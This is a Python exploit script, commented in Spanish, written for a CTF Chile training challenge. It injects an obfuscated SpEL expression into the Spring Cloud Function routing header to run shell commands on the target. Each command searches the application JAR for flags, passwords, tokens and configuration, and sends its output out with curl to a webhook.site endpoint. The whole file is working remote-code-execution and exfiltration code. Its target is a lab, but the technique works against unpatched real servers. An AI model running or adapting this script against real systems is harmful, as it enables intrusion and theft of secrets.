#!/usr/bin/env python3
"""
CTF Chile - Análisis profundo del JAR según pista de SEK
"""
import requests
import time
import base64

TARGET = "http://training-pod2.ctfchile.com:32785"
ROUTER = TARGET + "/functionRouter"

# Crear webhook
print("[*] Creando webhook para análisis del JAR...")
uuid_resp = requests.post("https://webhook.site/token", timeout=10)
UUID = uuid_resp.json()["uuid"]
WH = "https://webhook.site/" + UUID
print(f"    Webhook: https://webhook.site/#!/{UUID}")

def jar_probe(cmd, tag):
    shell = f"({cmd}) | base64 -w0 | xargs -I X curl -s '{WH}/{tag}?data=X'"
    payload = f'T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("exe"+"c",new String[]{{}}.getClass()).invoke(T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("getRunt"+"ime").invoke(null),new String[]{{"/bin/sh","-c","{shell}"}}).waitFor()'

    try:
        r = requests.post(ROUTER, headers={
            "spring.cloud.function.routing-expression": payload,
            "Content-Type": "text/plain",
        }, data="x", timeout=15)
        print(f"[{r.status_code}] {tag}")
        return r.status_code == 500
    except Exception as e:
        print(f"[ERR] {tag}: {str(e)[:40]}...")
        return False

print(f"\n{'='*70}")
print("🔍 ANÁLISIS PROFUNDO DEL JAR - BÚSQUEDA DE FLAGS")
print("Aplicando pista de SEK: 'busca algo para encontrar el flag'")
print(f"{'='*70}")

print(f"\n[1] ESTRUCTURA DEL JAR")
jar_probe("unzip -l /app/app.jar | head -20", "jar_structure")
jar_probe("unzip -l /app/app.jar | grep -E '(flag|secret|key|config|vault|auth)'", "jar_interesting_files")

print(f"\n[2] BUSCAR FLAGS EN STRINGS DEL JAR")
jar_probe("strings /app/app.jar | grep -i ctfchile", "jar_flags_direct")
jar_probe("strings /app/app.jar | grep -E 'ctfchile\\{[^\\}]*\\}'", "jar_flags_pattern")

print(f"\n[3] EXTRAER Y BUSCAR EN ARCHIVOS DE CONFIGURACIÓN")
jar_probe("unzip -p /app/app.jar application.properties 2>/dev/null", "jar_app_properties")
jar_probe("unzip -p /app/app.jar application.yml 2>/dev/null", "jar_app_yml")
jar_probe("unzip -p /app/app.jar bootstrap.properties 2>/dev/null", "jar_bootstrap_props")

print(f"\n[4] BUSCAR EN ARCHIVOS WEB (HTML/JS)")
jar_probe("unzip -l /app/app.jar | grep -E '\\.(html|js|json)$' | head -10", "jar_web_files")
jar_probe("unzip -p /app/app.jar static/index.html 2>/dev/null | grep -i ctfchile", "jar_index_html")

print(f"\n[5] BUSCAR EN MANIFEST Y METADATOS")
jar_probe("unzip -p /app/app.jar META-INF/MANIFEST.MF", "jar_manifest")
jar_probe("unzip -l /app/app.jar | grep META-INF", "jar_metainf")

print(f"\n[6] BUSCAR EN CLASES JAVA")
jar_probe("unzip -l /app/app.jar | grep -E '\\.class$' | grep -v '/\\$' | head -10", "jar_main_classes")
jar_probe("strings /app/app.jar | grep -E '(Flag|Secret|Token|Key)' | head -5", "jar_keywords")

print(f"\n[7] BUSCAR EN ARCHIVOS DE PLANTILLAS")
jar_probe("unzip -l /app/app.jar | grep -E 'templates.*\\.(html|jsp|ftl)$'", "jar_templates")
jar_probe("unzip -p /app/app.jar templates/index.html 2>/dev/null", "jar_template_index")

print(f"\n[8] EXTRAER TODO EL CONTENIDO TEXTUAL")
jar_probe("unzip -qq /app/app.jar -d /tmp/jar_extract && find /tmp/jar_extract -type f -exec grep -l 'ctfchile' {} \\; 2>/dev/null", "jar_extract_search")

print(f"\n[9] BUSCAR PATRONES ESPECÍFICOS EN STRINGS")
jar_probe("strings /app/app.jar | grep -E '(password|secret|api[_-]?key|token)' | head -5", "jar_secrets")
jar_probe("strings /app/app.jar | grep -E 'vault|bank|omni' | head -5", "jar_vault_refs")

print(f"\n[10] ANÁLISIS DE CONFIGURACIÓN SPRING")
jar_probe("unzip -p /app/app.jar BOOT-INF/classes/application.properties 2>/dev/null", "spring_boot_props")
jar_probe("unzip -l /app/app.jar | grep BOOT-INF/classes", "spring_boot_structure")

print(f"\n⏰ Esperando resultados del análisis...")
time.sleep(12)

print(f"\n🔍 ANÁLISIS DE RESULTADOS DEL JAR...")
try:
    r = requests.get(f"https://webhook.site/token/{UUID}/requests", timeout=20)
    data = r.json().get("data", [])

    flags_found = []
    config_files = []
    interesting_content = []

    for req in data[:25]:
        url = req.get("url", "")
        tag = url.split(UUID)[-1].split("?")[0].lstrip("/")
        query = req.get("query", {})
        raw_data = query.get("data", "")

        if isinstance(raw_data, list):
            raw_data = raw_data[0] if raw_data else ""

        if raw_data:
            try:
                decoded = base64.b64decode(raw_data).decode("utf-8", "replace")

                print(f"\n{'='*50}")
                print(f"📁 [{tag.upper()}]")
                print(f"{'='*50}")
                print(decoded)

                # Buscar flags explícitos
                if "ctfchile{" in decoded.lower():
                    flags_found.append((tag, decoded))
                    print(f"\n🚩🚩🚩 FLAG ENCONTRADO EN {tag}! 🚩🚩🚩")

                # Clasificar contenido interesante
                if any(keyword in tag for keyword in ["properties", "yml", "manifest"]):
                    config_files.append((tag, decoded))

                if any(keyword in decoded.lower() for keyword in ["flag", "secret", "key", "password", "vault"]):
                    interesting_content.append((tag, decoded[:200]))

            except Exception as e:
                print(f"\n[{tag}] (decode error): {raw_data[:100]}...")

    # Resumen final
    print(f"\n{'='*70}")
    print(f"📊 RESUMEN DEL ANÁLISIS DEL JAR")
    print(f"{'='*70}")

    if flags_found:
        print(f"🚩 FLAGS ENCONTRADOS: {len(flags_found)}")
        for tag, flag in flags_found:
            print(f"    📍 {tag}: {flag}")
            print(f"    🎯 ¡DESAFÍO COMPLETADO!")

    if config_files:
        print(f"\n📋 ARCHIVOS DE CONFIGURACIÓN: {len(config_files)}")
        for tag, content in config_files:
            print(f"    - {tag}: {len(content)} caracteres")

    if interesting_content:
        print(f"\n🔍 CONTENIDO INTERESANTE: {len(interesting_content)}")
        for tag, content in interesting_content:
            print(f"    - {tag}: {content[:100]}...")

    if not flags_found:
        print(f"💭 No se encontraron flags directos en el JAR")
        print(f"🔄 La flag puede estar en:")
        print(f"   1. Variables de entorno de la aplicación")
        print(f"   2. Configuración dinámica cargada en runtime")
        print(f"   3. Servicios externos que requieren autenticación")
        print(f"   4. Archivos temporales generados por la aplicación")
    else:
        print(f"\n🎉 ¡MISIÓN COMPLETADA!")
        print(f"   Infiltración a OmniVault exitosa")

except Exception as e:
    print(f"[!] Error analizando resultados: {e}")

print(f"\n🔗 Webhook completo: https://webhook.site/#!/{UUID}")
print(f"{'='*70}")